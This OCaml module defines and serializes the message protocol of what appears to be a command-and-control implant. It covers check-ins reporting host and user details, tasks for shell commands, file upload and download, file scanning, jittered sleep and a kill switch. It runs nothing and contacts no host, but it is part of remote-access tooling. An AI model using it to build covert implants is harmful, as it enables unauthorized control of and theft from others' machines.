type msg_id = string

type result_status =
  | Ok
  | Error of string

type scan_request = {
  roots : string list;
  patterns : (string * string) list;
  max_depth : int;
  max_file_size : int;
}

type task_op =
  | Shell of string
  | Upload of { path : string; contents : bytes }
  | Download of string
  | Sleep of { interval_s : int; jitter_pct : float }
  | Die
  | Scan of scan_request

type message =
  | Checkin of {
      id : msg_id;
      hostname : string;
      os : string;
      pid : int;
      user : string;
      interval_s : int;
    }
  | TaskResult of {
      id : msg_id;
      task_id : msg_id;
      status : result_status;
      data : bytes;
    }
  | Heartbeat of { id : msg_id }
  | Task of { id : msg_id; op : task_op }
  | Config of {
      id : msg_id;
      interval_s : int option;
      jitter_pct : float option;
      kill : bool;
    }
  | Ack of { id : msg_id; ref_id : msg_id }

let gen_id () =
  let raw = Mirage_crypto_rng.generate 8 in
  let buf = Buffer.create 16 in
  String.iter (fun c -> Buffer.add_string buf (Printf.sprintf "%02x" (Char.code c))) raw;
  Buffer.contents buf

let s key = Msgpck.String key
let i v = Msgpck.Int v
let b v = Msgpck.Bytes (Bytes.to_string v)

let result_status_to_msgpck = function
  | Ok -> Msgpck.List [ i 0 ]
  | Error msg -> Msgpck.List [ i 1; s msg ]

let scan_request_to_msgpck sr =
  Msgpck.Map
    [
      (s "r", Msgpck.List (List.map (fun x -> s x) sr.roots));
      ( s "p",
        Msgpck.List
          (List.map (fun (n, p) -> Msgpck.List [ s n; s p ]) sr.patterns) );
      (s "d", i sr.max_depth);
      (s "s", i sr.max_file_size);
    ]

let task_op_to_msgpck = function
  | Shell cmd -> Msgpck.List [ i 0; s cmd ]
  | Upload { path; contents } -> Msgpck.List [ i 1; s path; b contents ]
  | Download path -> Msgpck.List [ i 2; s path ]
  | Sleep { interval_s; jitter_pct } ->
    Msgpck.List [ i 3; i interval_s; Msgpck.Float jitter_pct ]
  | Die -> Msgpck.List [ i 4 ]
  | Scan sr -> Msgpck.List [ i 5; scan_request_to_msgpck sr ]

let to_msgpck = function
  | Checkin { id; hostname; os; pid; user; interval_s } ->
    Msgpck.Map
      [
        (s "t", i 0);
        (s "id", s id);
        (s "h", s hostname);
        (s "o", s os);
        (s "p", i pid);
        (s "u", s user);
        (s "i", i interval_s);
      ]
  | TaskResult { id; task_id; status; data } ->
    Msgpck.Map
      [
        (s "t", i 1);
        (s "id", s id);
        (s "ti", s task_id);
        (s "s", result_status_to_msgpck status);
        (s "d", b data);
      ]
  | Heartbeat { id } -> Msgpck.Map [ (s "t", i 2); (s "id", s id) ]
  | Task { id; op } ->
    Msgpck.Map [ (s "t", i 3); (s "id", s id); (s "op", task_op_to_msgpck op) ]
  | Config { id; interval_s; jitter_pct; kill } ->
    let fields =
      [ (s "t", i 4); (s "id", s id); (s "k", Msgpck.Bool kill) ]
    in
    let fields =
      match interval_s with
      | Some v -> fields @ [ (s "i", i v) ]
      | None -> fields
    in
    let fields =
      match jitter_pct with
      | Some v -> fields @ [ (s "j", Msgpck.Float v) ]
      | None -> fields
    in
    Msgpck.Map fields
  | Ack { id; ref_id } ->
    Msgpck.Map [ (s "t", i 5); (s "id", s id); (s "r", s ref_id) ]

let get_string key map =
  match List.assoc_opt (Msgpck.String key) map with
  | Some (Msgpck.String v) -> Result.ok v
  | _ -> Result.error (Printf.sprintf "missing or invalid string field: %s" key)

let get_int key map =
  match List.assoc_opt (Msgpck.String key) map with
  | Some (Msgpck.Int v) -> Result.ok v
  | _ -> Result.error (Printf.sprintf "missing or invalid int field: %s" key)

let get_bool key map =
  match List.assoc_opt (Msgpck.String key) map with
  | Some (Msgpck.Bool v) -> Result.ok v
  | _ -> Result.error (Printf.sprintf "missing or invalid bool field: %s" key)

let get_bytes key map =
  match List.assoc_opt (Msgpck.String key) map with
  | Some (Msgpck.Bytes v) -> Result.ok (Bytes.of_string v)
  | _ -> Result.error (Printf.sprintf "missing or invalid bytes field: %s" key)

let get_opt_int key map =
  match List.assoc_opt (Msgpck.String key) map with
  | Some (Msgpck.Int v) -> Result.ok (Some v)
  | None -> Result.ok None
  | _ -> Result.error (Printf.sprintf "invalid int field: %s" key)

let get_opt_float key map =
  match List.assoc_opt (Msgpck.String key) map with
  | Some (Msgpck.Float v) -> Result.ok (Some v)
  | None -> Result.ok None
  | _ -> Result.error (Printf.sprintf "invalid float field: %s" key)

let ( let* ) = Result.bind

let scan_request_of_msgpck = function
  | Msgpck.Map map ->
    let* roots =
      match List.assoc_opt (Msgpck.String "r") map with
      | Some (Msgpck.List items) ->
        List.fold_left
          (fun acc item ->
            let* lst = acc in
            match item with
            | Msgpck.String v -> Result.ok (lst @ [ v ])
            | _ -> Result.error "invalid root entry")
          (Result.ok []) items
      | _ -> Result.error "missing roots"
    in
    let* patterns =
      match List.assoc_opt (Msgpck.String "p") map with
      | Some (Msgpck.List items) ->
        List.fold_left
          (fun acc item ->
            let* lst = acc in
            match item with
            | Msgpck.List [ Msgpck.String n; Msgpck.String p ] ->
              Result.ok (lst @ [ (n, p) ])
            | _ -> Result.error "invalid pattern entry")
          (Result.ok []) items
      | _ -> Result.error "missing patterns"
    in
    let* max_depth = get_int "d" map in
    let* max_file_size = get_int "s" map in
    Result.ok { roots; patterns; max_depth; max_file_size }
  | _ -> Result.error "scan_request must be a map"

let task_op_of_msgpck = function
  | Msgpck.List (Msgpck.Int 0 :: Msgpck.String cmd :: _) ->
    Result.ok (Shell cmd)
  | Msgpck.List (Msgpck.Int 1 :: Msgpck.String path :: Msgpck.Bytes contents :: _)
    ->
    Result.ok (Upload { path; contents = Bytes.of_string contents })
  | Msgpck.List (Msgpck.Int 2 :: Msgpck.String path :: _) ->
    Result.ok (Download path)
  | Msgpck.List
      (Msgpck.Int 3 :: Msgpck.Int interval_s :: Msgpck.Float jitter_pct :: _) ->
    Result.ok (Sleep { interval_s; jitter_pct })
  | Msgpck.List (Msgpck.Int 4 :: _) -> Result.ok Die
  | Msgpck.List [ Msgpck.Int 5; sr ] ->
    let* req = scan_request_of_msgpck sr in
    Result.ok (Scan req)
  | _ -> Result.error "invalid task_op"

let result_status_of_msgpck = function
  | Msgpck.List [ Msgpck.Int 0 ] -> Result.ok Ok
  | Msgpck.List [ Msgpck.Int 1; Msgpck.String msg ] -> Result.ok (Error msg)
  | _ -> Result.error "invalid result_status"

let of_msgpck = function
  | Msgpck.Map map -> (
    let* tag = get_int "t" map in
    match tag with
    | 0 ->
      let* id = get_string "id" map in
      let* hostname = get_string "h" map in
      let* os = get_string "o" map in
      let* pid = get_int "p" map in
      let* user = get_string "u" map in
      let* interval_s = get_int "i" map in
      Result.ok (Checkin { id; hostname; os; pid; user; interval_s })
    | 1 ->
      let* id = get_string "id" map in
      let* task_id = get_string "ti" map in
      let* status_mp =
        match List.assoc_opt (Msgpck.String "s") map with
        | Some v -> Result.ok v
        | None -> Result.error "missing status"
      in
      let* status = result_status_of_msgpck status_mp in
      let* data = get_bytes "d" map in
      Result.ok (TaskResult { id; task_id; status; data })
    | 2 ->
      let* id = get_string "id" map in
      Result.ok (Heartbeat { id })
    | 3 ->
      let* id = get_string "id" map in
      let* op_mp =
        match List.assoc_opt (Msgpck.String "op") map with
        | Some v -> Result.ok v
        | None -> Result.error "missing op"
      in
      let* op = task_op_of_msgpck op_mp in
      Result.ok (Task { id; op })
    | 4 ->
      let* id = get_string "id" map in
      let* kill = get_bool "k" map in
      let* interval_s = get_opt_int "i" map in
      let* jitter_pct = get_opt_float "j" map in
      Result.ok (Config { id; interval_s; jitter_pct; kill })
    | 5 ->
      let* id = get_string "id" map in
      let* ref_id = get_string "r" map in
      Result.ok (Ack { id; ref_id })
    | n -> Result.error (Printf.sprintf "unknown message tag: %d" n))
  | _ -> Result.error "message must be a msgpack map"

let serialize msg =
  let mp = to_msgpck msg in
  let sz = Msgpck.size mp in
  let buf = Bytes.create sz in
  let n = Msgpck.Bytes.write buf mp in
  Bytes.sub_string buf 0 n

let deserialize data =
  try
    let _, mp = Msgpck.String.read data in
    of_msgpck mp
  with _ -> Result.error "msgpack parse error"
